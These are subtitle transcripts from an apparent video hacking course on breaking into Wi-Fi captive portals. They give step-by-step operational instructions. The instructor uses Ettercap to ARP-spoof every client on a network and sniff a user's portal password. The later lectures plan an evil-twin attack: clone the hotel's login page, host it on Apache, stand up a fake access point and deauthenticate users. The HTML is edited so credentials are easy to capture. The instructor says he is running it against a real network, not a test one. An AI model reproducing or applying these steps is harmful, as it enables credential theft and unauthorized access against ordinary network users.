face issues with running it against real networks.

54
00:03:34,530 --> 00:03:38,790
Now, I've suggested a lot of solutions for it, and the solutions usually work.

55
00:03:38,790 --> 00:03:42,510
But what I want to show you in this lecture, since you already know how to use man in the middle,

56
00:03:42,510 --> 00:03:47,730
if I'm going to show you another tool that I really, really like and I used to use even before man

57
00:03:47,730 --> 00:03:49,590
in the Middle life even existed.

58
00:03:49,620 --> 00:03:54,930
The thing is, this tool went out of date for a while and now it's actually being developed again and

59
00:03:54,930 --> 00:03:56,490
people are updating it again.

60
00:03:56,490 --> 00:03:59,130
So it works just as good as it used to be.

61
00:03:59,790 --> 00:04:01,380
Now I'm going to clear this.

62
00:04:02,410 --> 00:04:04,840
And the name of this tool is Ettercap.

63
00:04:04,870 --> 00:04:06,220
Now, you probably heard of it.

64
00:04:06,550 --> 00:04:12,550
So we can use Ettercap to do a large number of things, including becoming the man in the middle using

65
00:04:12,580 --> 00:04:13,780
ARP spoofing.

66
00:04:13,960 --> 00:04:15,810
So this is what we're interested in.

67
00:04:15,820 --> 00:04:17,170
We're going to do Ettercap.

68
00:04:19,160 --> 00:04:26,060
We're going to do minus t Q to tell it that I want to run in text mode and I want this text mode to

69
00:04:26,060 --> 00:04:26,780
be quiet.

70
00:04:26,780 --> 00:04:29,270
So that's what the T and Q stand for.

71
00:04:29,840 --> 00:04:36,620
We're going to tell it minus M to give it the mode that we want to run in and we want it to do ARP spoofing.

72
00:04:36,620 --> 00:04:39,170
So we're going to do ARP Remote.

73
00:04:40,590 --> 00:04:42,570
We're going to give it the interface.

74
00:04:43,780 --> 00:04:47,050
And finally, we want to target all the computers.

75
00:04:47,050 --> 00:04:49,050
We don't have one specific target.

76
00:04:49,060 --> 00:04:52,900
Any password will do will allow us to log in to the target network.

77
00:04:52,900 --> 00:04:55,270
So we're happy with anything that we get.

78
00:04:55,270 --> 00:05:02,710
So we're just going to do three forward slashes to say that I want you to target all the clients in

79
00:05:02,710 --> 00:05:04,000
the current network.

80
00:05:04,900 --> 00:05:10,210
So like I said, you can use man in the middle life if you're comfortable with it using this command,

81
00:05:10,210 --> 00:05:11,310
and that will work.

82
00:05:11,320 --> 00:05:16,420
I'm just showing this example to show you another tool that I really, really like, and it actually

83
00:05:16,420 --> 00:05:17,860
works very, very well.

84
00:05:18,250 --> 00:05:20,710
So the name of the tool is Ettercap.

85
00:05:21,100 --> 00:05:26,530
We're telling it that we want you to run in text mode and I want this text mode to be quiet.

86
00:05:26,980 --> 00:05:32,410
We're giving it the mode or the attack that we want to run and that attack is ARP spoofing.

87
00:05:32,410 --> 00:05:36,070
So for Ettercap you have to type it as ARP remote.

88
00:05:36,370 --> 00:05:44,320
We're giving it the interface and then at the end you have to specify the targets with Ettercap because

89
00:05:44,320 --> 00:05:46,030
we don't have a specific target.

90
00:05:46,060 --> 00:05:51,400
We're putting three forward slashes to say that I want you to target all the clients in the current

91
00:05:51,400 --> 00:05:52,120
network.

92
00:05:52,990 --> 00:05:54,760
Now I'm going to hit Enter.

93
00:05:58,100 --> 00:06:00,500
And now, as you can see, it is working.

94
00:06:00,500 --> 00:06:05,540
And it's telling me that it's targeting all the hosts in the list, which means all the clients in the

95
00:06:05,540 --> 00:06:06,260
network.

96
00:06:06,830 --> 00:06:12,290
Now, if you want to confirm that this attack is working, you can go on the Windows machine and check

97
00:06:12,290 --> 00:06:17,840
the ERP table, make sure that the Router's Mac address changed to the Kali Machine's Mac address.

98
00:06:17,870 --> 00:06:19,040
You don't have to do that.

99
00:06:19,040 --> 00:06:21,380
You can just do that to confirm that it's working.

100
00:06:21,590 --> 00:06:27,770
But now if I come to the Windows machine here, you can see that it's automatically showing me the bar

101
00:06:27,770 --> 00:06:29,630
on top saying that I need to log in.

102
00:06:29,630 --> 00:06:34,550
Even though I had logged in to this network, I could I could use the Internet and do anything I want.

103
00:06:34,700 --> 00:06:37,640
Now, if I try to go to any different Web page.

104
00:06:40,510 --> 00:06:46,900
You'll see that it's automatically redirecting me to the login page and it's literally preventing me

105
00:06:46,900 --> 00:06:47,890
from going anywhere.

106
00:06:47,890 --> 00:06:54,220
Even though this client has already signed into this network and should already have access to the internet.

107
00:06:54,580 --> 00:06:57,910
The reason for this is because any request.

108
00:06:57,940 --> 00:07:01,840
Now, this client sends is being sent to the Kali machine.

109
00:07:01,870 --> 00:07:04,810
The Kali machine does not have access to the internet.

110
00:07:04,810 --> 00:07:07,960
So the response that Kali gets is this page.

111
00:07:08,140 --> 00:07:15,220
Therefore, Kali forwards this response to this computer which is being poisoned.

112
00:07:15,220 --> 00:07:17,560
And that's why we're seeing this login page.

113
00:07:17,560 --> 00:07:20,980
So again, you don't have to do a authentication attack.

114
00:07:20,980 --> 00:07:24,850
In this case, the user will automatically be asked to log in.

115
00:07:25,330 --> 00:07:29,220
So now the user has nothing to do but to enter their password again.

116
00:07:29,230 --> 00:07:31,390
So let's put the password.

117
00:07:32,980 --> 00:07:33,790
Hit enter.

118
00:07:35,750 --> 00:07:40,280
Now it's trying to take me to Google and it's complaining about secure connection because the person

119
00:07:40,280 --> 00:07:44,210
is in the middle of the connection, but now the user has Internet connection.

120
00:07:44,210 --> 00:07:46,070
So if they go to Bing.com.

121
00:07:47,650 --> 00:07:49,360
They have their Internet connection.

122
00:07:49,360 --> 00:07:50,740
Everything is back to normal.

123
00:07:50,740 --> 00:07:51,430
They're happy.

124
00:07:51,430 --> 00:07:52,830
They can browse again.

125
00:07:52,840 --> 00:07:59,770
If we go to Cali again, we won't have to go to Wireshark this time because Ettercap will automatically

126
00:07:59,770 --> 00:08:05,140
analyze the data for us just like man in the middle F So as you can see, it captured that there was

127
00:08:05,140 --> 00:08:12,310
a Http request for a username and the password was one two, three, four, five, six and the login

128
00:08:12,310 --> 00:08:14,470
was submitted through this page.

129
00:08:15,400 --> 00:08:18,940
Now we can quit Wireshark by typing on the keyboard.

130
00:08:19,710 --> 00:08:20,400
And that's it.

131
00:08:20,430 --> 00:08:23,400
Now we can just go try to browse any page.

132
00:08:23,420 --> 00:08:24,600
Enter the password.

133
00:08:24,600 --> 00:08:26,190
One, two, three, four, five, six.

134
00:08:26,190 --> 00:08:26,940
And that's it.

135
00:08:26,970 --> 00:08:29,250
We have access to the captive portal.

136
00:08:30,440 --> 00:08:35,440
Now, again, the really cool thing about this method is you won't have to do the authentication attack.

137
00:08:35,450 --> 00:08:40,760
And even if the user has already logged in and authenticated with the network, they'll automatically

138
00:08:40,760 --> 00:08:46,610
be asked to enter their login credentials again and you'll automatically be able to see the password

139
00:08:46,610 --> 00:08:49,490
without having to go to Wireshark and analyze the data.

140
00:08:49,490 --> 00:08:54,110
Because again, Ettercap or man in the middle F will do the hard work for you.



━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1
00:00:00,680 --> 00:00:05,270
So far we've seen a number of methods to gain access to captive portals.

2
00:00:05,540 --> 00:00:10,790
Now, let's say your target network was using encryption or for any other reason, you just couldn't

3
00:00:10,790 --> 00:00:14,480
gain your access to the network using the methods I showed you.

4
00:00:14,510 --> 00:00:21,740
Then the last resort is to target the users and use social engineering to gain your access to the target

5
00:00:21,770 --> 00:00:22,520
network.

6
00:00:23,180 --> 00:00:30,050
Now, this is usually the case when we fail to hack into the system using the software and the hardware

7
00:00:30,050 --> 00:00:30,620
installed.

8
00:00:30,620 --> 00:00:37,520
Then the last resort will be to try to target the users because the users are always considered to be

9
00:00:37,520 --> 00:00:38,540
the weakest link.

10
00:00:38,540 --> 00:00:45,590
So you can always social engineer them and gain your access by targeting the users that use the target

11
00:00:45,590 --> 00:00:46,250
system.

12
00:00:47,470 --> 00:00:53,770
So the idea that I'm going to talk about can be used to gain access to captive portals, but it can

13
00:00:53,770 --> 00:01:00,700
also be used to gain access to all types of other networks like networks that use WEP, WPA, or WPA,

14
00:01:00,700 --> 00:01:01,270
too.

15
00:01:02,110 --> 00:01:04,340
So the idea is very simple.

16
00:01:04,360 --> 00:01:11,740
First of all, we're going to clone the login page that the people are used to use with the normal captive

17
00:01:11,740 --> 00:01:14,020
portal, with the normal network that they use.

18
00:01:14,050 --> 00:01:19,330
We're going to make a website that look exactly like the website that they use when they first connect

19
00:01:19,330 --> 00:01:20,380
to that network.

20
00:01:21,190 --> 00:01:28,420
Then we're going to create a fake network, an access point that has the same name or a similar name

21
00:01:28,420 --> 00:01:29,470
to the target.

22
00:01:29,500 --> 00:01:35,950
Now, because our target is a captive portal, then this won't be suspicious at all because people captive

23
00:01:35,950 --> 00:01:41,290
portals are usually used in airports and hotels and places that have a large area.

24
00:01:41,290 --> 00:01:45,430
So they actually use a number of routers to cover this area.

25
00:01:45,460 --> 00:01:51,170
Therefore, if the user sees a number of networks with the same name or with a similar name, they won't

26
00:01:51,170 --> 00:01:55,040
get suspicious at all because this is actually the way it is in real life.

27
00:01:56,150 --> 00:02:02,720
Finally, we're going to run a D authentication attack and disconnect users from the network that they're

28
00:02:02,720 --> 00:02:03,850
connected to.

29
00:02:03,860 --> 00:02:07,670
So they'll think that there's something wrong with this specific network.

30
00:02:07,700 --> 00:02:13,490
They're going to connect to the fake network that we created, which has a very similar name or maybe

31
00:02:13,490 --> 00:02:14,330
the same name.

32
00:02:14,330 --> 00:02:18,560
And once they connect, they'll automatically see a login page.

33
00:02:18,780 --> 00:02:22,820
Again, this is exactly what happens when they connect to their network.

34
00:02:22,820 --> 00:02:28,160
So they automatically see a login page and the login page is going to look very similar to the login

35
00:02:28,160 --> 00:02:30,470
page that they usually use and log in with.

36
00:02:30,650 --> 00:02:35,810
Now obviously this login page that we're going to create will not have any type of security and will

37
00:02:35,810 --> 00:02:41,840
be able to sniff the data once they put their username or password and then we'll be able to log in

38
00:02:41,840 --> 00:02:45,410
to the actual network that we're targeting.

39
00:02:46,590 --> 00:02:51,750
Now I'm going to spend a lecture or two on each of these steps, and I'm going to try to keep these

40
00:02:51,750 --> 00:02:58,770
steps as generic as possible so that you can use this idea to adapt it to any type of network that you

41
00:02:58,770 --> 00:02:59,190
have.

42
00:02:59,220 --> 00:03:05,550
So the next lectures we're going to be doing the example on a captive portal, but you can use the exact

43
00:03:05,550 --> 00:03:09,900
same way to gain access to WEP, WPA and Wpa2 networks.

44
00:03:09,900 --> 00:03:17,100
And later on I'm going to show you how you can adapt this idea to hack into WPA Wpa2 networks without

45
00:03:17,100 --> 00:03:21,150
having to use a word list and without even having to capture the handshake.

46
00:03:21,570 --> 00:03:26,340
So I'm just going to go over the idea one more time just to make it simple, just so that you get the

47
00:03:26,340 --> 00:03:26,860
idea.

48
00:03:26,880 --> 00:03:33,030
So first of all, we are going to download and clone the login page that the captive portal usually

49
00:03:33,030 --> 00:03:33,660
use.

50
00:03:33,780 --> 00:03:40,020
Then we're going to create a fake access point that has the same or a similar name to that network.

51
00:03:40,050 --> 00:03:45,330
Then we're going to disconnect the authenticate all the people that connect to that network and wait

52
00:03:45,330 --> 00:03:47,230
for them to connect to our network.

53
00:03:47,380 --> 00:03:55,240
Once they do that, they'll automatically see a login page with the same login page that the actual

54
00:03:55,240 --> 00:03:56,260
network use.

55
00:03:56,260 --> 00:04:00,250
So this won't be suspicious at all because like I said, they're used to connect.

56
00:04:00,280 --> 00:04:03,580
They're used to seeing a number of access points with the same name.

57
00:04:03,580 --> 00:04:07,000
And when they connect, this is the actual procedure that they see.

58
00:04:07,000 --> 00:04:11,620
They'll automatically see a login page and the login page is going to look exactly like the page that

59
00:04:11,620 --> 00:04:12,610
they expect.

60
00:04:12,610 --> 00:04:18,040
So it's not going to be suspicious at all and it usually has a very good success rate.


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1
00:00:00,080 --> 00:00:06,380
Now, the first step into running this attack is to clone the login page that the people usually use

2
00:00:06,380 --> 00:00:08,240
to log in to their network.

3
00:00:08,720 --> 00:00:14,450
Now, again, I'm keeping this as generic as possible so you can use this method to clone any web page

4
00:00:14,450 --> 00:00:14,810
you want.

5
00:00:14,840 --> 00:00:15,440
Really.

6
00:00:16,370 --> 00:00:19,280
Now I'm going to go to my Kali machine right here.

7
00:00:20,500 --> 00:00:25,270
And I'm going to go ahead and connect to the network that I want to target.

8
00:00:25,480 --> 00:00:31,030
So I'm going to go here on the top and I'm going to click on Wi-Fi.

9
00:00:31,750 --> 00:00:33,970
I'm going to select Network.

10
00:00:34,360 --> 00:00:39,040
And I'm going to select my target network right here, which is called Royal WiFi.

11
00:00:39,070 --> 00:00:40,390
I'm going to connect.

12
00:00:43,910 --> 00:00:48,350
And as you can see right here, I'm connected to my target network.

13
00:00:48,770 --> 00:00:55,010
Now, usually the target network should automatically show you a login screen if you are on an on a

14
00:00:55,010 --> 00:00:58,400
smartphone or on Windows or even OSX.

15
00:00:58,400 --> 00:01:02,690
But for some reason on Kali, it doesn't always show it to you automatically.

16
00:01:02,690 --> 00:01:05,600
So you'll have to manually go to the web browser.

17
00:01:06,950 --> 00:01:09,470
And then just browse for any web page.

18
00:01:09,830 --> 00:01:13,580
So I'm just going to go to Google, for example.

19
00:01:15,580 --> 00:01:21,510
And as you can see, I get automatically redirected to the captive portal login page.

20
00:01:21,520 --> 00:01:26,200
And first of all, it's asking me to choose a language, so I'm just going to click on English.

21
00:01:27,110 --> 00:01:29,140
Then it's given me two options.

22
00:01:29,150 --> 00:01:32,780
I can sign up and pay money or I can just log in.

23
00:01:32,810 --> 00:01:34,880
If I have a username and a password.

24
00:01:34,880 --> 00:01:36,230
So I'm going to log in.

25
00:01:37,010 --> 00:01:43,190
And as you can see right here, it's asking me for a username and a password.

26
00:01:43,190 --> 00:01:47,090
And then once I put the username and the password, I can click on log in.

27
00:01:47,090 --> 00:01:51,950
And then if the username and password are correct, it's going to let me into the network and then I'll

28
00:01:51,950 --> 00:01:53,540
be able to use the internet.

29
00:01:53,690 --> 00:01:56,390
So this is the page that we want to clone.

30
00:01:56,390 --> 00:02:02,690
This is the page that we want to display to our targets once they connect to our fake access point.

31
00:02:03,800 --> 00:02:09,940
So to clone this web page, we can actually just use a built in functionality in Firefox.

32
00:02:09,950 --> 00:02:17,630
So all we have to do is just click on the alt button on the keyboard that will display the menu bar

33
00:02:17,630 --> 00:02:18,830
here on the top.

34
00:02:19,550 --> 00:02:23,570
We're going to go to file Save page as.

35
00:02:25,390 --> 00:02:30,720
And then I'm just going to select the location where I want to save this particular web page.

36
00:02:30,730 --> 00:02:35,860
So I'm going to go to downloads and I'm going to create a new directory for it.

37
00:02:38,430 --> 00:02:42,450
And I'm just going to call it royal login page.

38
00:02:42,480 --> 00:02:48,260
I'm going to create and it's automatically going to call this welcome online.

39
00:02:48,270 --> 00:02:51,960
And I've configured this to download the whole web page.

40
00:02:51,960 --> 00:02:56,400
So as you can see here at the bottom right, I have Web page complete.

41
00:02:56,400 --> 00:02:58,020
I'm going to click on Save.

42
00:02:59,860 --> 00:03:00,670
And that's it.

43
00:03:00,700 --> 00:03:04,480
Now the web page is downloaded in my downloads directory.

44
00:03:05,940 --> 00:03:07,800
Now I'm going to quit this.

45
00:03:08,890 --> 00:03:12,010
I'm going to go to the files right here.

46
00:03:13,200 --> 00:03:14,850
I'm going to go to downloads.

47
00:03:16,210 --> 00:03:22,570
And as you can see here, I have my royal login page, the place where I downloaded the web page in.

48
00:03:24,340 --> 00:03:30,310
And you can see we have two files right here related to the Web page we downloaded.

49
00:03:30,730 --> 00:03:34,270
So first we have the Web page itself right here.

50
00:03:34,360 --> 00:03:38,850
And in here we have the files used by this web page.

51
00:03:38,860 --> 00:03:41,110
So this will contain the images.

52
00:03:41,110 --> 00:03:45,670
It will contain the JavaScript, the style files and all that.

53
00:03:45,760 --> 00:03:47,320
So if I double click it.

54
00:03:48,800 --> 00:03:57,680
You'll see I have CSS files, JavaScript files and pictures used inside that main login page right here.

55
00:03:57,890 --> 00:04:03,650
So when you're trying to clone this, you need to use both of these because this web page right here

56
00:04:03,650 --> 00:04:06,980
refers to the files inside this directory.

57
00:04:06,980 --> 00:04:11,900
So if it can't find the files in here, the web page won't be displayed properly.

58
00:04:12,860 --> 00:04:15,440
So if I just double click this real quick.

59
00:04:16,710 --> 00:04:18,300
It's going to open in Firefox.

60
00:04:19,050 --> 00:04:25,510
And as you can see, it looks very similar to the web page that we that the captive portal uses.

61
00:04:25,530 --> 00:04:27,330
We can click on login here.

62
00:04:27,330 --> 00:04:33,630
We can put a username and a password and it's an identical replica of the web page used in the captive

63
00:04:33,630 --> 00:04:34,320
portal.

64
00:04:35,340 --> 00:04:39,930
Now I'm going to quit this again because we can't share this with our users.

65
00:04:39,960 --> 00:04:47,580
We have to put this into our web server so that we can redirect people to it and display it to them

66
00:04:47,580 --> 00:04:50,460
when they connect to our fake access point.

67
00:04:51,120 --> 00:04:54,240
So I'm going to copy both of these files.

68
00:04:57,360 --> 00:05:03,030
Then I'm going to go to my web route, which is the location where you should store the files on your

69
00:05:03,030 --> 00:05:07,040
web server that you want to show to the users that visit your web server.

70
00:05:07,050 --> 00:05:10,980
So that's going to be in var w-w-w HTML.

71
00:05:13,260 --> 00:05:14,100
Now.

72
00:05:14,100 --> 00:05:15,810
I'm going to paste them in here.

73
00:05:17,800 --> 00:05:20,890
And as you can see now, I have my files here.

74
00:05:21,340 --> 00:05:28,200
Now, by default, the Web server will display a page that's called index.html.

75
00:05:28,210 --> 00:05:32,050
And as you can see here, we automatically have a default index.

76
00:05:32,290 --> 00:05:35,380
So you can either rename this or delete it.

77
00:05:35,410 --> 00:05:38,350
I'm just going to delete it because I'm not going to use it.

78
00:05:40,920 --> 00:05:44,340
Then I'm going to rename the welcome online page.

79
00:05:44,340 --> 00:05:50,310
So I'm going to right click it rename and I'm going to name it index.html.

80
00:05:50,790 --> 00:05:57,210
Now, I did this so that when people access my IP, so when they access my web server, even if they

81
00:05:57,210 --> 00:06:04,590
don't put a file name, they'll automatically see this index page, this page because I called it index.html

82
00:06:04,590 --> 00:06:08,220
and it's going to display the login page that we just cloned.

83
00:06:08,790 --> 00:06:10,530
So let's have a look on this.

84
00:06:10,530 --> 00:06:13,890
I'm going to first of all, we're going to have to start our Web server.

85
00:06:15,600 --> 00:06:20,760
And we can do that by doing service Apache to start.

86
00:06:21,420 --> 00:06:23,130
That'll start my web server.

87
00:06:24,820 --> 00:06:28,030
And now I can go on Firefox again.

88
00:06:29,640 --> 00:06:35,670
And I'm just going to go you can go to your own IP address or you can just go to localhost or.

89
00:06:36,330 --> 00:06:39,450
127.0.0.1.

90
00:06:39,450 --> 00:06:45,540
And this basically just tells the browser to open the web server installed on the current computer so

91
00:06:45,540 --> 00:06:46,920
it's your current IP.

92
00:06:48,000 --> 00:06:54,180
And as you can see, we'll automatically see the login page that we cloned without having to put anything

93
00:06:54,180 --> 00:06:54,690
in here.

94
00:06:54,690 --> 00:06:56,010
We just put the address.

95
00:06:56,010 --> 00:06:59,700
So in the future, we're going to be putting our address on the network.

96
00:06:59,700 --> 00:07:05,310
Right now I'm not connected to anything, so I'm just putting 127001 or you can put localhost.

97
00:07:05,310 --> 00:07:08,250
And as you can see now, the web page works perfectly.

98
00:07:08,250 --> 00:07:13,710
We can put a username and a password and then if your users see it, it still looks identical to the

99
00:07:13,710 --> 00:07:15,300
page that they use.


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1
00:00:00,630 --> 00:00:06,870
Okay, now we have the website downloaded and we have it installed on our web server and it looks good.

2
00:00:06,870 --> 00:00:08,220
There's nothing wrong with it.

3
00:00:08,490 --> 00:00:14,580
I just want to show you a few things that you might need to tweak before the website works well with

4
00:00:14,580 --> 00:00:15,870
the fake access point.

5
00:00:15,900 --> 00:00:21,690
Now, you might not have to do any of this, but in my example right here, I actually have to do it

6
00:00:21,690 --> 00:00:24,350
because the website is just written that way.

7
00:00:24,360 --> 00:00:30,180
So I'm going to show you these things so that if you face them in a real life scenario, you know how

8
00:00:30,180 --> 00:00:31,080
to deal with it.

9
00:00:31,380 --> 00:00:34,830
Now I'm actually running this attack against a real network.

10
00:00:34,830 --> 00:00:38,100
So this is not a fake network or a test network.

11
00:00:40,070 --> 00:00:44,200
So I have the website here and this is the index.html.

12
00:00:44,210 --> 00:00:50,960
And like I said, this is the file that contains the code for the website itself, and it refers to

13
00:00:50,960 --> 00:00:55,190
stuff that's used that's stored in the welcome online directory.

14
00:00:55,580 --> 00:00:59,060
Now, before I modify this file, I'm going to use a text editor.

15
00:00:59,060 --> 00:01:02,720
That's nice for modifying code and it's really lightweight.

16
00:01:02,840 --> 00:01:05,630
So I'm going to show you how to install it first.

17
00:01:05,630 --> 00:01:09,860
And I'm going to go on my Terminator and I'm just going to do apt get.

18
00:01:10,710 --> 00:01:12,720
Install genie.

19
00:01:14,030 --> 00:01:18,260
So upset is what we usually use to install applications.

20
00:01:18,260 --> 00:01:21,260
We're telling it that we want to install and the program.

21
00:01:21,260 --> 00:01:24,560
The text editor that I want to install is called Genie.

22
00:01:25,130 --> 00:01:27,950
Now I'm going to hit Enter and I've already installed this.

23
00:01:27,950 --> 00:01:32,930
So as you can see, it's already installed and it's the newest version, so there is no need for me

24
00:01:32,930 --> 00:01:33,590
to install it.

25
00:01:33,590 --> 00:01:36,200
But for you it's going to ask you if you want to install it.

26
00:01:36,230 --> 00:01:39,500
Type y hit enter and it will install it for you.

27
00:01:40,190 --> 00:01:46,540
Once it's installed, we're going to come back to our page here that we want to modify, which is index.html.

28
00:01:46,550 --> 00:01:51,170
I'm going to right click it and I'm going to open it with other application.

29
00:01:52,730 --> 00:01:54,680
I'm going to select Gini from here.

30
00:01:54,680 --> 00:01:59,510
If it's not showing up in here, click on View All Applications and find Gini.

31
00:02:00,220 --> 00:02:03,390
Then I'm going to click on Select to open it with Genie.

32
00:02:04,420 --> 00:02:10,540
Now right here I have the HTML or the markup code for this website.

33
00:02:11,720 --> 00:02:18,680
So everything that's being displayed in here is actually coded in this particular file.

34
00:02:19,100 --> 00:02:26,180
So the things that I want to modify, first of all, the pictures here, this picture and this picture

35
00:02:26,180 --> 00:02:28,930
are being referred to relatively.

36
00:02:28,940 --> 00:02:32,330
And this is a term that's used in web design and all that.

37
00:02:32,330 --> 00:02:38,960
So I don't want to get into too much details into it, but basically the Web page is referring to the

38
00:02:38,960 --> 00:02:46,640
location of these images relative to where we are right now relative to the URL that we are in right

39
00:02:46,640 --> 00:02:47,210
now.

40
00:02:47,630 --> 00:02:53,810
So in the future, when we're going to use this on a fake access point and then we're going to be redirecting

41
00:02:53,810 --> 00:03:00,470
requests that the people make to this web page, the web page will work, but the images will not load

42
00:03:00,470 --> 00:03:05,300
because the location that the page is referring to will be invalid.

43
00:03:05,510 --> 00:03:12,450
So what I want to do, I want to modify the code in here that refers to these images, and I want to

44
00:03:12,450 --> 00:03:15,150
make sure that it refers to the right location.

45
00:03:15,150 --> 00:03:19,890
And I'm going to do that by using a static location to these images.

46
00:03:20,780 --> 00:03:27,710
Now we know that these images are being stored in this directory, the welcome online files.

47
00:03:27,980 --> 00:03:29,930
So I'm just going to go to the code.

48
00:03:30,110 --> 00:03:34,670
I'm going to go on search and I'm going to go on find.

49
00:03:35,940 --> 00:03:39,060
And I'm going to look for welcome online and I'm just going to type in.

50
00:03:39,060 --> 00:03:39,780
Welcome.

51
00:03:41,790 --> 00:03:43,320
I'm going to click on next.

52
00:03:45,300 --> 00:03:48,870
And as you can see now, the first welcome online is just a title.

53
00:03:48,870 --> 00:03:50,190
So I'm going to skip that.

54
00:03:52,340 --> 00:03:54,230
The next one is a link.

55
00:03:54,230 --> 00:03:55,610
So that's what I'm looking for.

56
00:03:55,610 --> 00:04:02,030
I'm going to close this and as you can see, it's a link to a file called Basics.

57
00:04:02,030 --> 00:04:03,800
So this is a style file.

58
00:04:03,800 --> 00:04:10,040
And if we come here on Welcome Online, you'll see I have a file that's called basics.

59
00:04:10,760 --> 00:04:16,940
Now, if we look at the URL in here, you'll see that the URL starts with the name straight away.

60
00:04:16,940 --> 00:04:20,720
So you see welcome online directly what this means.

61
00:04:20,720 --> 00:04:27,140
It means that this URL is a relative URL, so it's relative to the URL that's already loaded on the

62
00:04:27,140 --> 00:04:27,980
web browser.

63
00:04:28,010 --> 00:04:33,110
Therefore, when we're going to be using DNS spoofing and we're going to be redirecting requests, the

64
00:04:33,110 --> 00:04:36,650
web browser will not know where welcome online is.

65
00:04:37,040 --> 00:04:42,110
So all we have to do is literally just add a forward slash in front of it.

66
00:04:42,760 --> 00:04:49,240
And this way the web browser will know that he has to go all the way back to the IP and then look for

67
00:04:49,240 --> 00:04:52,720
a directory called Welcome Online followed by the file name.

68
00:04:53,020 --> 00:05:00,010
So all we have to do is literally make sure after the href, after the source URL for whatever file

69
00:05:00,010 --> 00:05:04,600
that's being loaded, we have to make sure that it starts with a forward slash.

70
00:05:05,080 --> 00:05:11,770
So again, this is only happening to me because the way that this web page was written, it was written

71
00:05:11,770 --> 00:05:15,100
to use relative URLs or relative locations.

72
00:05:15,100 --> 00:05:20,950
So the page that you clone might not be using this and you may not need to do this anyway.

73
00:05:21,130 --> 00:05:26,860
So I'm just showing you how to do it just in case your web, your web page is programmed the same way

74
00:05:26,860 --> 00:05:27,670
as mine.

75
00:05:28,360 --> 00:05:31,990
Now, this is only one file that's being used by this web page.

76
00:05:31,990 --> 00:05:34,360
And this web page uses a large number of files.

77
00:05:34,360 --> 00:05:35,260
As we can see here.

78
00:05:35,260 --> 00:05:37,360
We have a large number of files.

79
00:05:37,360 --> 00:05:39,880
So I'm not going to be doing this manually.

80
00:05:40,770 --> 00:05:45,210
So I'm going to first delete this and then I'm just going to copy all this.

81
00:05:45,210 --> 00:05:48,210
So head ref equals welcome online files.

82
00:05:49,220 --> 00:05:51,470
I'm going to right click copy.

83
00:05:51,950 --> 00:05:54,350
Then I'm going to go to the search menu again.

84
00:05:54,740 --> 00:05:57,530
I'm going to go to the replace this time.

85
00:05:57,530 --> 00:06:03,920
So the first time I went on find, now I'm going on replace and you can see it automatically has what

86
00:06:03,920 --> 00:06:10,910
I copied in here in the search for and in the replace with I'm going to replace it with the exact same

87
00:06:10,910 --> 00:06:17,210
thing so I'm going to paste it and all I want to do is literally just add a forward slash in here.

88
00:06:17,840 --> 00:06:24,800
Now I'm going to click on the replace all in here and then I'm going to do in document so that anytime

89
00:06:24,800 --> 00:06:32,060
it sees this, it's going to add a forward slash to it and it's going to fix all the locations that's

90
00:06:32,060 --> 00:06:33,590
used in this web page.

91
00:06:34,580 --> 00:06:39,320
Now, if we go back here and do a refresh, you won't really see any difference.

92
00:06:39,320 --> 00:06:41,120
You won't see anything changed.

93
00:06:41,120 --> 00:06:47,360
But if you are actually using this on a fake web page, you'll see that the images would not load if

94
00:06:47,360 --> 00:06:52,250
you leave the URLs without fixing them to use static URLs.



━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1
00:00:01,060 --> 00:00:07,300
Now, before we can use this website, there is one more thing that you want to make sure that it's

2
00:00:07,300 --> 00:00:08,350
done properly.

3
00:00:08,590 --> 00:00:12,070
So I'm going to come in here on the input.

4
00:00:12,080 --> 00:00:17,560
I'm going to right click it and I'm going to click on Inspect Element.

5
00:00:18,580 --> 00:00:21,970
This still show me the code that's used.

6
00:00:21,970 --> 00:00:28,150
Basically the HTML code that we used to see when we opened the text editor But when I select the input

7
00:00:28,150 --> 00:00:34,690
and click inspect element, it will show me the code that's responsible for rendering this input.

8
00:00:35,610 --> 00:00:40,860
So right here, as you can see, I have an input tag and if I go on it, it highlights the input that's

9
00:00:40,860 --> 00:00:42,240
being displayed in the web page.

10
00:00:42,240 --> 00:00:43,230
So that's cool.

11
00:00:43,230 --> 00:00:49,410
And what we need to make sure that it exists in the web page is a form tag.

12
00:00:49,410 --> 00:00:55,860
So we want to make sure that these inputs, the username, the password and the login button are all

13
00:00:55,860 --> 00:00:58,230
wrapped in a form tag.

14
00:00:58,560 --> 00:01:04,680
So if we look in here, this shows you the hierarchy of the tags in the page.

15
00:01:04,680 --> 00:01:10,290
And if you literally just keep going up, you want to see, you should see something called form in

16
00:01:10,290 --> 00:01:10,890
here.

17
00:01:11,250 --> 00:01:13,920
Now, as you can see, I don't see any of that.

18
00:01:13,920 --> 00:01:15,420
And that's a problem.

19
00:01:15,420 --> 00:01:22,560
So if you did this, if you right click your input and click on Inspect Element and see that the inputs

20
00:01:22,560 --> 00:01:28,110
are being wrapped in a form in a form tag, then you don't need to do what I'm going to do, but I'm

21
00:01:28,110 --> 00:01:29,580
only going to do the next steps.

22
00:01:29,580 --> 00:01:36,880
Now I'm going to manually add the form tag in my web page because it will make it so much easier for

23
00:01:36,880 --> 00:01:40,930
us to capture the user name and read it using a simple sniffer.

24
00:01:42,160 --> 00:01:47,110
So what I'm going to do right now is I'm going to right click my index again.

25
00:01:47,110 --> 00:01:50,290
I'm going to open it with Genie like we did before.

26
00:01:50,830 --> 00:01:56,650
And we can also do the same thing that we just did, just to confirm to see if we have a form or not.

27
00:01:56,950 --> 00:01:59,230
I'm just going to go to the start of the document.

28
00:02:00,970 --> 00:02:06,100
I'm going to go on search find and I'm just going to look for a form tag.

29
00:02:06,100 --> 00:02:08,590
So open the tag and just type in form.

30
00:02:09,130 --> 00:02:15,100
Now, if I hit enter, as you can see, it says that there is no such thing called form in the web page.

31
00:02:15,100 --> 00:02:17,550
Therefore, that's a problem for me.

32
00:02:17,560 --> 00:02:20,350
Again, if you have a form tag, then skip this video.

33
00:02:20,350 --> 00:02:21,460
You don't need to do it.

34
00:02:21,460 --> 00:02:26,470
I'm only going to do it because I don't have a form tag, so I'm going to manually add it.

35
00:02:26,470 --> 00:02:31,390
So it's very easy for me in the future to sniff the username and password and see it through all the

36
00:02:31,390 --> 00:02:32,140
packets.

37
00:02:32,830 --> 00:02:40,030
Now, like I said, the form tag needs to wrap the username and the password input and the login button,

38
